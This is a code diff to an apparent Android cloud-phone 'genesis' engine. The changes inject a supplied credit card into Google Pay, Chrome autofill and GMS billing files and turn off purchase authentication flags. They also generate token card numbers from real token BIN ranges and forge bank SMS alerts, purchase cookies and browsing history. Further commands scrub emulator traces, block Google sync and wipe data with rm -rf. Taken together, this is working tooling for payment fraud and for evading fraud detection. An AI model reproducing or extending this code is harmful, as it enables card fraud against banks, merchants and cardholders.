@@ -23,6 +23,7 @@ and async_adb_cmd for shell operations (content insert, sqlite3, resetprop).
 from __future__ import annotations
 
 import asyncio
+import hashlib
 import json
 import os
 import random
@@ -43,6 +44,46 @@ logger = setup_json_logging("vmos_genesis")
 # ── Helpers ────────────────────────────────────────────────────────────────
 
 _PROFILES_DIR = Path(os.environ.get("TITAN_DATA", "/opt/titan/data")) / "profiles"
+
+# ── TSP-assigned Token BIN ranges (for DPAN generation) ───────────────────
+_TOKEN_BIN_RANGES = {
+    "visa":       ["489537", "489538", "489539", "440066", "440067"],
+    "mastercard": ["530060", "530061", "530062", "530063", "530064", "530065"],
+    "amex":       ["374800", "374801"],
+    "discover":   ["601156", "601157"],
+}
+
+# ── Bank SMS sender IDs ──────────────────────────────────────────────────
+_BANK_SMS_SENDERS = {
+    "visa": [
+        ("33789", "Chase: Your card ending in {last4} was charged ${amt:.2f} at {merchant}"),
+        ("73981", "BofA Alert: Purchase of ${amt:.2f} on card ending {last4}"),
+    ],
+    "mastercard": [
+        ("227462", "Capital One: Transaction alert for card ...{last4}: ${amt:.2f} at {merchant}"),
+        ("95686", "Citi Alert: ${amt:.2f} charge on card ending in {last4} at {merchant}"),
+    ],
+    "amex": [("26297", "Amex: Card ending {last4} charged ${amt:.2f} at {merchant}")],
+    "discover": [("347268", "Discover: ${amt:.2f} purchase on card ending {last4}")],
+}
+
+# ── Purchase history merchants ────────────────────────────────────────────
+_MERCHANTS = [
+    {"name": "Amazon.com", "domain": "amazon.com", "cookies": ["session-id", "ubid-main"],
+     "amounts": (15.99, 149.99)},
+    {"name": "Walmart", "domain": "walmart.com", "cookies": ["auth", "cart-item-count"],
+     "amounts": (7.97, 98.00)},
+    {"name": "Target", "domain": "target.com", "cookies": ["visitorId"],
+     "amounts": (8.00, 45.00)},
+    {"name": "Starbucks", "domain": "starbucks.com", "cookies": ["JSESSIONID"],
+     "amounts": (4.75, 12.50)},
+    {"name": "Netflix", "domain": "netflix.com", "cookies": ["NetflixId"],
+     "amounts": (15.49, 22.99)},
+    {"name": "Uber Eats", "domain": "ubereats.com", "cookies": ["sid"],
+     "amounts": (12.00, 45.00)},
+    {"name": "DoorDash", "domain": "doordash.com", "cookies": ["dd-session"],
+     "amounts": (15.00, 55.00)},
+]
 
 
 def _gen_imei(tac_prefix: str) -> str:
@@ -67,6 +108,48 @@ def _gen_android_id() -> str:
 
 def _gen_gsf_id() -> str:
     return str(random.randint(3000000000000000000, 3999999999999999999))
+
+
+def _detect_network(card_number: str) -> str:
+    """Detect card network from BIN prefix."""
+    first = card_number[0] if card_number else ""
+    if first == "4":
+        return "visa"
+    elif first in ("5", "2"):
+        return "mastercard"
+    elif first == "3":
+        return "amex"
+    elif first == "6":
+        return "discover"
+    return "visa"
+
+
+def _gen_dpan(card_number: str) -> str:
+    """Generate DPAN using real TSP-assigned Token BIN ranges."""
+    network = _detect_network(card_number)
+    token_bin = random.choice(_TOKEN_BIN_RANGES.get(network, _TOKEN_BIN_RANGES["visa"]))
+    remaining_len = len(card_number) - 7  # 6 BIN digits + 1 check digit
+    body = "".join([str(random.randint(0, 9)) for _ in range(remaining_len)])
+    partial = token_bin + body
+    # Luhn check digit
+    digits = [int(d) for d in partial]
+    total = 0
+    for i, d in enumerate(reversed(digits)):
+        if i % 2 == 0:
+            doubled = d * 2
+            total += doubled - 9 if doubled > 9 else doubled
+        else:
+            total += d
+    check = (10 - total % 10) % 10
+    return partial + str(check)
+
+
+def _gen_luk_seed(dpan: str, atc: int) -> str:
+    """Generate Limited Use Key seed via HMAC-SHA256 derivation."""
+    import hmac as _hmac
+    master = hashlib.sha256(f"TITAN-MK-{dpan}".encode()).digest()
+    derived = _hmac.new(master, f"{dpan}{atc:04d}".encode(), hashlib.sha256).hexdigest()
+    return derived[:32]
 
 
 def _sanitize(val: str) -> str:
@@ -313,10 +396,18 @@ class VMOSGenesisEngine:
                 "/data/data/com.android.chrome/app_chrome/Default/History "
                 "/data/data/com.android.chrome/app_chrome/Default/Login\\ Data "
                 "/data/data/com.android.chrome/app_chrome/Default/'Web Data' 2>/dev/null; "
-                # Clear wallet
+                # Clear wallet (BOTH paths)
                 "rm -rf /data/data/com.google.android.gms/databases/tapandpay.db* 2>/dev/null; "
+                "rm -rf /data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db* 2>/dev/null; "
+                "rm -rf /data/data/com.google.android.apps.walletnfcrel/shared_prefs/*.xml 2>/dev/null; "
+                "rm -rf /data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null; "
+                "rm -rf /data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml 2>/dev/null; "
+                "rm -rf /data/data/com.google.android.gms/shared_prefs/payment_profile_prefs.xml 2>/dev/null; "
                 # Clear UsageStats
                 "rm -rf /data/system/usagestats/0/* 2>/dev/null; "
+                # Clear WiFi config
+                "rm -f /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null; "
+                "rm -f /data/misc/wifi/WifiConfigStore.xml 2>/dev/null; "
                 # Clear gallery
                 "rm -f /sdcard/DCIM/Camera/*.jpg /data/media/0/DCIM/Camera/*.jpg 2>/dev/null; "
                 "echo WIPE_DONE"
@@ -509,10 +600,34 @@ class VMOSGenesisEngine:
             boot_ok = await self._sh_ok(boot_cmd, "BOOT_ALIGNED", timeout=15)
             self._log(f"Phase 1h — Boot alignment: {'ok' if boot_ok else 'partial'}")
 
+            # ── 1i. NFC enable (required for wallet) ──
+            nfc_cmd = (
+                "settings put secure nfc_on 1 2>/dev/null; "
+                "settings put secure nfc_payment_foreground 1 2>/dev/null; "
+                "svc nfc enable 2>/dev/null; "
+                "echo NFC_ON"
+            )
+            nfc_ok = await self._sh_ok(nfc_cmd, "NFC_ON", timeout=10)
+            self._log(f"Phase 1i — NFC enable: {'ok' if nfc_ok else 'partial'}")
+
+            # ── 1j. VMOS-specific artifact scrubbing ──
+            vmos_cmd = (
+                "resetprop --delete ro.vmos.simplest.rom 2>/dev/null; "
+                "resetprop --delete ro.vmos.version 2>/dev/null; "
+                "resetprop --delete persist.sys.cloud.wifi.ssid 2>/dev/null; "
+                "resetprop --delete ro.cloudphone 2>/dev/null; "
+                "resetprop --delete persist.sys.cloud.phone 2>/dev/null; "
+                "pm disable-user --user 0 com.vmos.toolbox 2>/dev/null; "
+                "pm hide com.vmos.toolbox 2>/dev/null; "
+                "echo VMOS_CLEAN"
+            )
+            vmos_ok = await self._sh_ok(vmos_cmd, "VMOS_CLEAN", timeout=15)
+            self._log(f"Phase 1j — VMOS scrub: {'ok' if vmos_ok else 'partial'}")
+
             elapsed = time.time() - t0
-            sub_ok = sum([root_ok, prop_ok, proc_ok, boot_ok])
-            self._set_phase(n, "done", f"{ok_count}/{total} props, {sub_ok}/4 stealth, {elapsed:.0f}s")
-            self._log(f"Phase 1 — Stealth done: {ok_count}/{total} props, {sub_ok}/4 stealth in {elapsed:.0f}s")
+            sub_ok = sum([root_ok, prop_ok, proc_ok, boot_ok, nfc_ok, vmos_ok])
+            self._set_phase(n, "done", f"{ok_count}/{total} props, {sub_ok}/6 stealth, {elapsed:.0f}s")
+            self._log(f"Phase 1 — Stealth done: {ok_count}/{total} props, {sub_ok}/6 stealth in {elapsed:.0f}s")
 
         except Exception as e:
             self._set_phase(n, "failed", str(e)[:80])
@@ -715,7 +830,59 @@ class VMOSGenesisEngine:
                 )
                 playstore_ok = await self._sh_ok(playstore_cmd, "PLAYSTORE_SET", timeout=15)
 
-            ok_str = f"acct={'ok' if acct_ok else 'fail'} gms={'ok' if gms_ok else 'fail'} gsf={'ok' if gsf_ok else 'fail'} playstore={'ok' if playstore_ok else 'fail'}"
+            # ── Chrome sign-in prefs ──
+            chrome_ok = False
+            for browser_pkg in ["com.android.chrome", "com.kiwibrowser.browser"]:
+                chrome_prefs_dir = f"/data/data/{browser_pkg}/app_chrome/Default"
+                chrome_cmd = (
+                    f"mkdir -p {chrome_prefs_dir} 2>/dev/null; "
+                    f"cat > {chrome_prefs_dir}/Preferences << 'CHREOF'\n"
+                    + json.dumps({
+                        "account_info": [{
+                            "email": e_safe,
+                            "full_name": name,
+                            "gaia": "117234567890",
+                            "given_name": f_safe,
+                            "locale": "en-US",
+                        }],
+                        "signin": {"allowed": True, "allowed_on_next_startup": True},
+                        "sync": {"has_setup_completed": True},
+                        "browser": {"has_seen_welcome_page": True},
+                    }) +
+                    f"\nCHREOF\n"
+                    f"chown $(stat -c '%u:%g' /data/data/{browser_pkg}/ 2>/dev/null) "
+                    f"{chrome_prefs_dir}/Preferences 2>/dev/null; "
+                    f"restorecon {chrome_prefs_dir}/Preferences 2>/dev/null; "
+                    f"echo CHROME_SET"
+                )
+                r = await self._sh_ok(chrome_cmd, "CHROME_SET", timeout=15)
+                if r:
+                    chrome_ok = True
+
+            # ── Gmail + YouTube + Maps prefs ──
+            extra_ok = 0
+            for pkg in ["com.google.android.gm", "com.google.android.youtube",
+                        "com.google.android.apps.maps"]:
+                extra_cmd = (
+                    f"mkdir -p /data/data/{pkg}/shared_prefs 2>/dev/null; "
+                    f"cat > /data/data/{pkg}/shared_prefs/account_prefs.xml << 'EXTEOF'\n"
+                    f'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
+                    f"<map>\n"
+                    f'  <string name=\"signed_in_account\">{e_safe}</string>\n'
+                    f'  <boolean name=\"account_configured\" value=\"true\" />\n'
+                    f"</map>\n"
+                    f"EXTEOF\n"
+                    f"chown $(stat -c '%u:%g' /data/data/{pkg}/ 2>/dev/null) "
+                    f"/data/data/{pkg}/shared_prefs/account_prefs.xml 2>/dev/null; "
+                    f"echo EXTRA_SET"
+                )
+                r = await self._sh_ok(extra_cmd, "EXTRA_SET", timeout=10)
+                if r:
+                    extra_ok += 1
+
+            ok_str = (f"acct={'ok' if acct_ok else 'fail'} gms={'ok' if gms_ok else 'fail'} "
+                      f"gsf={'ok' if gsf_ok else 'fail'} playstore={'ok' if playstore_ok else 'fail'} "
+                      f"chrome={'ok' if chrome_ok else 'fail'} extra={extra_ok}/3")
             self._set_phase(n, "done" if acct_ok else "warn", ok_str)
             self._log(f"Phase 4 — Google Account: {ok_str}")
 
@@ -1000,7 +1167,7 @@ class VMOSGenesisEngine:
             self._log(f"Phase 5 — Inject FAILED: {e}")
 
     async def _phase_wallet(self, cfg: PipelineConfig, profile: Dict[str, Any]):
-        """Phase 6: Wallet / GPay credit card injection."""
+        """Phase 6: Wallet / GPay — 5 subsystem injection matching purchase validation docs."""
         n = 6
         cc = cfg.cc_number.replace(" ", "").replace("-", "")
         if not cc or len(cc) < 13:
@@ -1008,7 +1175,9 @@ class VMOSGenesisEngine:
             self._log("Phase 6 — Wallet: skipped (no card data)")
             return
         self._set_phase(n, "running")
-        self._log(f"Phase 6 — Wallet: injecting card ***{cc[-4:]}...")
+        self._log(f"Phase 6 — Wallet: injecting card ***{cc[-4:]} into 5 subsystems...")
+        t0 = time.time()
+        results = {}
         try:
             # Parse expiry
             exp_parts = cfg.cc_exp.split("/") if "/" in cfg.cc_exp else [cfg.cc_exp[:2], cfg.cc_exp[2:]]
@@ -1017,84 +1186,346 @@ class VMOSGenesisEngine:
             if exp_year < 100:
                 exp_year += 2000
             holder = cfg.cc_holder or cfg.name or "Cardholder"
-
-            # Determine card network from BIN
-            first = cc[0]
-            network = "visa"
-            if first == "5":
-                network = "mastercard"
-            elif first == "3":
-                network = "amex"
-            elif first == "6":
-                network = "discover"
-
-            # ── 6a. Chrome Web Data (autofill credit card) ──
-            chrome_dir = "/data/data/com.android.chrome/app_chrome/Default"
-            card_guid = str(uuid.uuid4())
-            holder_safe = holder.replace("'", "''")
-            web_data_cmd = (
-                f"sqlite3 {chrome_dir}/\"Web Data\" \""
-                f"CREATE TABLE IF NOT EXISTS credit_cards "
-                f"(guid TEXT PRIMARY KEY, name_on_card TEXT, card_number_encrypted BLOB, "
-                f"expiration_month INTEGER, expiration_year INTEGER, "
-                f"date_modified INTEGER, origin TEXT, billing_address_id TEXT, nickname TEXT); "
-                f"INSERT OR REPLACE INTO credit_cards "
-                f"(guid, name_on_card, card_number_encrypted, expiration_month, expiration_year, "
-                f"date_modified, origin, billing_address_id, nickname) "
-                f"VALUES('{card_guid}', '{holder_safe}', X'{cc.encode().hex()}', "
-                f"{exp_month}, {exp_year}, {int(time.time())}, 'https://pay.google.com', '', '{network.upper()}');\" "
-                f"2>/dev/null; "
-                f"chown $(stat -c '%u:%g' {chrome_dir}/) {chrome_dir}/\"Web Data\" 2>/dev/null; "
-                f"echo WEBDATA_DONE"
-            )
-            webdata_ok = await self._sh_ok(web_data_cmd, "WEBDATA_DONE", timeout=15)
-
-            # ── 6b. GMS tapandpay.db ──
-            dpan = "5" + "".join([str(random.randint(0,9)) for _ in range(14)])
-            token_ref = secrets.token_hex(16)
+            email = _sanitize(cfg.google_email or cfg.email or "")
+            network = _detect_network(cc)
             network_id = {"visa": 1, "mastercard": 2, "amex": 3, "discover": 4}.get(network, 1)
-            display = f"{network.upper()} ****{cc[-4:]}"
-            tpay_cmd = (
-                "mkdir -p /data/data/com.google.android.gms/databases 2>/dev/null; "
-                f"sqlite3 /data/data/com.google.android.gms/databases/tapandpay.db \""
-                f"CREATE TABLE IF NOT EXISTS token_metadata ("
-                f"id INTEGER PRIMARY KEY, dpan TEXT, last_four TEXT, network INTEGER, "
-                f"token_ref TEXT, display_name TEXT, is_default INTEGER, "
-                f"card_color INTEGER, token_state INTEGER); "
-                f"INSERT OR REPLACE INTO token_metadata "
-                f"(id, dpan, last_four, network, token_ref, display_name, is_default, "
-                f"card_color, token_state) VALUES "
-                f"(1, '{dpan}', '{cc[-4:]}', {network_id}, "
-                f"'{token_ref}', '{display}', 1, -12285185, 3);\" 2>/dev/null; "
-                f"chown $(stat -c '%u:%g' /data/data/com.google.android.gms/) "
-                f"/data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null; "
-                f"echo TPAY_DONE"
-            )
-            tpay_ok = await self._sh_ok(tpay_cmd, "TPAY_DONE", timeout=15)
+            last4 = cc[-4:]
+            dpan = _gen_dpan(cc)
+            token_ref = secrets.token_hex(16)
+            luk_seed = _gen_luk_seed(dpan, 1)
+            display = f"{network.upper()} ····{last4}"
+            holder_safe = holder.replace("'", "''")
+            now_ts = int(time.time())
+            birth_ts = now_ts - (cfg.age_days * 86400)
 
-            # ── 6c. GMS billing prefs ──
-            email = cfg.google_email or cfg.email or ""
-            billing_cmd = (
+            # ══════════════════════════════════════════════════════════════
+            # SUBSYSTEM 1: Google Pay (tapandpay.db) — FULL SCHEMA
+            # ══════════════════════════════════════════════════════════════
+            # Generate transaction history entries
+            tx_entries_sql = []
+            for i in range(random.randint(5, 12)):
+                m = random.choice(_MERCHANTS)
+                tx_amt = round(random.uniform(*m["amounts"]), 2)
+                tx_ts = birth_ts + random.randint(86400 * 7, cfg.age_days * 86400)
+                tx_id = secrets.token_hex(8)
+                tx_entries_sql.append(
+                    f"INSERT INTO transaction_history (transaction_id, amount_cents, "
+                    f"currency_code, merchant_name, timestamp_ms, dpan, status) VALUES "
+                    f"('{tx_id}', {int(tx_amt * 100)}, 'USD', "
+                    f"'{m['name']}', {tx_ts * 1000}, '{dpan}', 'COMPLETED');"
+                )
+
+            # Build full tapandpay.db with 5 tables
+            tpay_sql = (
+                # Table 1: token_metadata
+                "CREATE TABLE IF NOT EXISTS token_metadata ("
+                "id INTEGER PRIMARY KEY, dpan TEXT, last_four TEXT, network INTEGER, "
+                "token_ref TEXT, display_name TEXT, is_default INTEGER, "
+                "card_color INTEGER, token_state INTEGER, issuer_name TEXT, "
+                "card_art_url TEXT, provisioning_status TEXT, "
+                "expiry_month INTEGER, expiry_year INTEGER); "
+                f"INSERT OR REPLACE INTO token_metadata VALUES "
+                f"(1, '{dpan}', '{last4}', {network_id}, '{token_ref}', "
+                f"'{display}', 1, -12285185, 3, "
+                f"'{holder_safe}', '', 'PROVISIONED', {exp_month}, {exp_year}); "
+                # Table 2: tokens
+                "CREATE TABLE IF NOT EXISTS tokens ("
+                "id INTEGER PRIMARY KEY, token_data TEXT, pan_last_four TEXT, "
+                "network_id INTEGER, token_state INTEGER); "
+                f"INSERT OR REPLACE INTO tokens VALUES "
+                f"(1, '{token_ref}', '{last4}', {network_id}, 3); "
+                # Table 3: emv_metadata
+                "CREATE TABLE IF NOT EXISTS emv_metadata ("
+                "id INTEGER PRIMARY KEY, dpan TEXT, luk_seed TEXT, "
+                "atc INTEGER, derivation_type TEXT); "
+                f"INSERT OR REPLACE INTO emv_metadata VALUES "
+                f"(1, '{dpan}', '{luk_seed}', 1, 'HMAC_SHA256'); "
+                # Table 4: transaction_history
+                "CREATE TABLE IF NOT EXISTS transaction_history ("
+                "transaction_id TEXT PRIMARY KEY, amount_cents INTEGER, "
+                "currency_code TEXT, merchant_name TEXT, timestamp_ms INTEGER, "
+                "dpan TEXT, status TEXT); "
+                + " ".join(tx_entries_sql) + " "
+                # Table 5: payment_instrument
+                "CREATE TABLE IF NOT EXISTS payment_instrument ("
+                "id INTEGER PRIMARY KEY, instrument_id TEXT, display_name TEXT, "
+                "network TEXT, last_four TEXT, is_active INTEGER); "
+                f"INSERT OR REPLACE INTO payment_instrument VALUES "
+                f"(1, 'instrument_1', '{display}', '{network}', '{last4}', 1);"
+            )
+
+            # Inject into BOTH paths
+            for db_dir in [
+                "/data/data/com.google.android.gms/databases",
+                "/data/data/com.google.android.apps.walletnfcrel/databases",
+            ]:
+                tpay_cmd = (
+                    f"mkdir -p {db_dir} 2>/dev/null; "
+                    f"sqlite3 {db_dir}/tapandpay.db \"{tpay_sql}\" 2>/dev/null; "
+                    f"echo TPAY_OK"
+                )
+                await self._sh_ok(tpay_cmd, "TPAY_OK", timeout=20)
+
+            # Fix ownership for both paths
+            own_cmd = (
+                "for d in /data/data/com.google.android.gms "
+                "/data/data/com.google.android.apps.walletnfcrel; do "
+                "  uid=$(stat -c '%u:%g' $d 2>/dev/null); "
+                "  [ -n \"$uid\" ] && chown -R $uid $d/databases/ 2>/dev/null; "
+                "  chmod 660 $d/databases/tapandpay.db 2>/dev/null; "
+                "  restorecon -R $d/databases/ 2>/dev/null; "
+                "done; echo OWN_OK"
+            )
+            results["tapandpay"] = await self._sh_ok(own_cmd, "OWN_OK", timeout=15)
+            self._log(f"Phase 6a — tapandpay.db: {'ok' if results['tapandpay'] else 'fail'} (5 tables, {len(tx_entries_sql)} transactions)")
+
+            # ══════════════════════════════════════════════════════════════
+            # SUBSYSTEM 2: Play Store Billing (COIN.xml) — 6 ZERO-AUTH FLAGS
+            # ══════════════════════════════════════════════════════════════
+            auth_token = secrets.token_hex(32)
+            coin_cmd = (
                 "mkdir -p /data/data/com.google.android.gms/shared_prefs 2>/dev/null; "
                 f"cat > /data/data/com.google.android.gms/shared_prefs/COIN.xml << 'COINEOF'\n"
                 f'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
                 f"<map>\n"
                 f'  <boolean name=\"has_payment_methods\" value=\"true\" />\n'
                 f'  <string name=\"default_instrument_id\">instrument_1</string>\n'
-                f'  <string name=\"account_name\">{_sanitize(email)}</string>\n'
+                f'  <string name=\"account_name\">{email}</string>\n'
                 f'  <boolean name=\"wallet_enabled\" value=\"true\" />\n'
+                f'  <string name=\"payment_method_id\">pm_{token_ref[:16]}</string>\n'
+                f'  <string name=\"payment_method_last_four\">{last4}</string>\n'
+                f'  <string name=\"payment_method_type\">{network.upper()}</string>\n'
+                f'  <boolean name=\"purchase_requires_auth\" value=\"false\" />\n'
+                f'  <boolean name=\"require_purchase_auth\" value=\"false\" />\n'
+                f'  <boolean name=\"one_touch_enabled\" value=\"true\" />\n'
+                f'  <boolean name=\"biometric_payment_enabled\" value=\"true\" />\n'
+                f'  <string name=\"auth_token\">{auth_token}</string>\n'
                 f"</map>\n"
                 f"COINEOF\n"
                 "chown $(stat -c '%u:%g' /data/data/com.google.android.gms/) "
                 "/data/data/com.google.android.gms/shared_prefs/COIN.xml 2>/dev/null; "
-                "echo COIN_DONE"
+                "echo COIN_OK"
             )
-            coin_ok = await self._sh_ok(billing_cmd, "COIN_DONE", timeout=15)
+            results["coin"] = await self._sh_ok(coin_cmd, "COIN_OK", timeout=15)
+            self._log(f"Phase 6b — COIN.xml: {'ok' if results['coin'] else 'fail'} (6 zero-auth flags)")
 
-            results = f"web_data={'ok' if webdata_ok else 'fail'} tpay={'ok' if tpay_ok else 'fail'} coin={'ok' if coin_ok else 'fail'}"
-            ok_total = sum([webdata_ok, tpay_ok, coin_ok])
-            self._set_phase(n, "done" if ok_total >= 2 else "warn", f"{ok_total}/3 targets")
-            self._log(f"Phase 6 — Wallet: {results}")
+            # ══════════════════════════════════════════════════════════════
+            # SUBSYSTEM 3: Chrome Autofill (Web Data) — card_number = NULL
+            # ══════════════════════════════════════════════════════════════
+            card_guid = str(uuid.uuid4())
+            for chrome_dir in ["/data/data/com.android.chrome/app_chrome/Default",
+                               "/data/data/com.kiwibrowser.browser/app_chrome/Default"]:
+                web_data_cmd = (
+                    f"sqlite3 {chrome_dir}/\"Web Data\" \""
+                    f"CREATE TABLE IF NOT EXISTS credit_cards "
+                    f"(guid TEXT PRIMARY KEY, name_on_card TEXT, card_number_encrypted BLOB, "
+                    f"expiration_month INTEGER, expiration_year INTEGER, "
+                    f"date_modified INTEGER, origin TEXT, billing_address_id TEXT, nickname TEXT); "
+                    f"INSERT OR REPLACE INTO credit_cards "
+                    f"(guid, name_on_card, card_number_encrypted, expiration_month, expiration_year, "
+                    f"date_modified, origin, billing_address_id, nickname) "
+                    f"VALUES('{card_guid}', '{holder_safe}', NULL, "
+                    f"{exp_month}, {exp_year}, {now_ts}, 'https://pay.google.com', '', "
+                    f"'{network.upper()} ····{last4}');\" 2>/dev/null; "
+                    f"chown $(stat -c '%u:%g' {chrome_dir}/ 2>/dev/null) {chrome_dir}/\"Web Data\" 2>/dev/null; "
+                    f"echo WD_OK"
+                )
+                r = await self._sh_ok(web_data_cmd, "WD_OK", timeout=15)
+                if r:
+                    results["chrome_autofill"] = True
+            if "chrome_autofill" not in results:
+                results["chrome_autofill"] = False
+            self._log(f"Phase 6c — Chrome autofill: {'ok' if results['chrome_autofill'] else 'fail'}")
+
+            # ══════════════════════════════════════════════════════════════
+            # SUBSYSTEM 4: GMS Billing State (wallet + payment prefs)
+            # ══════════════════════════════════════════════════════════════
+            gms_prefs_cmd = (
+                "mkdir -p /data/data/com.google.android.gms/shared_prefs 2>/dev/null; "
+                # wallet_instrument_prefs.xml
+                f"cat > /data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml << 'WIPEOF'\n"
+                f'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
+                f"<map>\n"
+                f'  <boolean name=\"wallet_setup_complete\" value=\"true\" />\n'
+                f'  <string name=\"active_instrument_id\">instrument_1</string>\n'
+                f'  <string name=\"instrument_network\">{network}</string>\n'
+                f'  <string name=\"instrument_last4\">{last4}</string>\n'
+                f'  <long name=\"instrument_added_timestamp\" value=\"{birth_ts * 1000}\" />\n'
+                f"</map>\n"
+                f"WIPEOF\n"
+                # payment_profile_prefs.xml
+                f"cat > /data/data/com.google.android.gms/shared_prefs/payment_profile_prefs.xml << 'PPPEOF'\n"
+                f'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
+                f"<map>\n"
+                f'  <boolean name=\"payment_methods_synced\" value=\"true\" />\n'
+                f'  <string name=\"payment_profile_email\">{email}</string>\n'
+                f'  <boolean name=\"payment_profile_active\" value=\"true\" />\n'
+                f'  <long name=\"last_sync_timestamp\" value=\"{now_ts * 1000}\" />\n'
+                f"</map>\n"
+                f"PPPEOF\n"
+                "chown $(stat -c '%u:%g' /data/data/com.google.android.gms/) "
+                "/data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml "
+                "/data/data/com.google.android.gms/shared_prefs/payment_profile_prefs.xml 2>/dev/null; "
+                "echo GMS_BILL_OK"
+            )
+            results["gms_billing"] = await self._sh_ok(gms_prefs_cmd, "GMS_BILL_OK", timeout=15)
+            self._log(f"Phase 6d — GMS billing: {'ok' if results['gms_billing'] else 'fail'}")
+
+            # ══════════════════════════════════════════════════════════════
+            # SUBSYSTEM 5: NFC Configuration + Bank SMS
+            # ══════════════════════════════════════════════════════════════
+
+            # NFC prefs + system enable
+            nfc_cmd = (
+                "settings put secure nfc_on 1 2>/dev/null; "
+                "settings put secure nfc_payment_foreground 1 2>/dev/null; "
+                "mkdir -p /data/data/com.google.android.apps.walletnfcrel/shared_prefs 2>/dev/null; "
+                f"cat > /data/data/com.google.android.apps.walletnfcrel/shared_prefs/nfc_on_prefs.xml << 'NFCEOF'\n"
+                f'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n'
+                f"<map>\n"
+                f'  <boolean name=\"nfc_enabled\" value=\"true\" />\n'
+                f'  <boolean name=\"tap_and_pay_enabled\" value=\"true\" />\n'
+                f"</map>\n"
+                f"NFCEOF\n"
+                "chown $(stat -c '%u:%g' /data/data/com.google.android.apps.walletnfcrel/ 2>/dev/null) "
+                "/data/data/com.google.android.apps.walletnfcrel/shared_prefs/nfc_on_prefs.xml 2>/dev/null; "
+                "echo NFC_OK"
+            )
+            results["nfc"] = await self._sh_ok(nfc_cmd, "NFC_OK", timeout=15)
+            self._log(f"Phase 6e — NFC: {'ok' if results['nfc'] else 'fail'}")
+
+            # Bank SMS injection
+            sms_senders = _BANK_SMS_SENDERS.get(network, _BANK_SMS_SENDERS["visa"])
+            sms_cmds = []
+            for i in range(min(5, len(tx_entries_sql))):
+                sender_id, template = random.choice(sms_senders)
+                m = random.choice(_MERCHANTS)
+                amt = round(random.uniform(*m["amounts"]), 2)
+                body = template.format(last4=last4, amt=amt, merchant=m["name"])
+                body_safe = _sanitize(body).replace("'", "''")[:150]
+                sms_ts = (birth_ts + random.randint(86400 * 7, cfg.age_days * 86400)) * 1000
+                sms_cmds.append(
+                    f"content insert --uri content://sms "
+                    f"--bind address:s:\"{sender_id}\" --bind body:s:\"{body_safe}\" "
+                    f"--bind type:i:1 --bind date:l:{sms_ts} --bind read:i:1 2>/dev/null"
+                )
+            if sms_cmds:
+                sms_script = " && ".join(sms_cmds) + " && echo BANK_SMS_OK"
+                results["bank_sms"] = await self._sh_ok(sms_script, "BANK_SMS_OK", timeout=20)
+            else:
+                results["bank_sms"] = True
+            self._log(f"Phase 6f — Bank SMS: {'ok' if results.get('bank_sms') else 'fail'} ({len(sms_cmds)} msgs)")
+
+            # ══════════════════════════════════════════════════════════════
+            # PURCHASE HISTORY BRIDGE — Chrome commerce coherence
+            # ══════════════════════════════════════════════════════════════
+            ph_cookies_sql = []
+            ph_history_sql = []
+            for i in range(random.randint(5, 15)):
+                m = random.choice(_MERCHANTS)
+                purchase_ts = birth_ts + random.randint(86400 * 3, cfg.age_days * 86400)
+                chrome_ts = int(purchase_ts * 1000000 + 11644473600000000)
+                # Commerce cookie
+                for cname in m["cookies"][:2]:
+                    cval = secrets.token_hex(12)
+                    creation_us = chrome_ts - random.randint(0, 86400 * 1000000)
+                    expiry_us = chrome_ts + 31536000 * 1000000
+                    ph_cookies_sql.append(
+                        f"INSERT OR IGNORE INTO cookies "
+                        f"(host_key,name,value,path,is_secure,is_httponly,"
+                        f"creation_utc,expires_utc,last_access_utc) "
+                        f"VALUES('.{m['domain']}','{cname}','{cval}','/',1,0,"
+                        f"{int(creation_us)},{int(expiry_us)},{int(chrome_ts)});"
+                    )
+                # Purchase confirmation URL
+                order_id = secrets.token_hex(6).upper()
+                ph_history_sql.append(
+                    f"INSERT OR IGNORE INTO urls (url,title,visit_count,last_visit_time) "
+                    f"VALUES('https://www.{m['domain']}/order/{order_id}',"
+                    f"'Order Confirmation - {m['name']}',1,{chrome_ts});"
+                )
+
+            chrome_dir = "/data/data/com.android.chrome/app_chrome/Default"
+            if ph_cookies_sql:
+                ph_cookie_batch = "\n".join(ph_cookies_sql)
+                ph_cmd = (
+                    f"sqlite3 {chrome_dir}/Cookies \"{ph_cookie_batch}\" 2>/dev/null; "
+                    f"chown $(stat -c '%u:%g' {chrome_dir}/ 2>/dev/null) {chrome_dir}/Cookies 2>/dev/null; "
+                    f"echo PH_COOK_OK"
+                )
+                results["purchase_cookies"] = await self._sh_ok(ph_cmd, "PH_COOK_OK", timeout=15)
+
+            if ph_history_sql:
+                ph_hist_batch = "\n".join(ph_history_sql)
+                ph_cmd = (
+                    f"sqlite3 {chrome_dir}/History \"{ph_hist_batch}\" 2>/dev/null; "
+                    f"chown $(stat -c '%u:%g' {chrome_dir}/ 2>/dev/null) {chrome_dir}/History 2>/dev/null; "
+                    f"echo PH_HIST_OK"
+                )
+                results["purchase_history"] = await self._sh_ok(ph_cmd, "PH_HIST_OK", timeout=15)
+
+            self._log(f"Phase 6g — Purchase bridge: cookies={'ok' if results.get('purchase_cookies') else 'fail'} "
+                      f"history={'ok' if results.get('purchase_history') else 'fail'}")
+
+            # ══════════════════════════════════════════════════════════════
+            # CLOUD SYNC BLOCKING — prevent Google overwriting injected data
+            # ══════════════════════════════════════════════════════════════
+            sync_cmd = (
+                "appops set com.android.vending RUN_IN_BACKGROUND deny 2>/dev/null; "
+                "appops set com.google.android.gms RUN_IN_BACKGROUND deny 2>/dev/null; "
+                "echo SYNC_BLOCKED"
+            )
+            results["sync_block"] = await self._sh_ok(sync_cmd, "SYNC_BLOCKED", timeout=10)
+
+            # ══════════════════════════════════════════════════════════════
+            # POST-WALLET VERIFICATION (7 checks)
+            # ══════════════════════════════════════════════════════════════
+            verify_cmd = (
+                "echo V1=$(ls /data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null && echo OK || echo FAIL); "
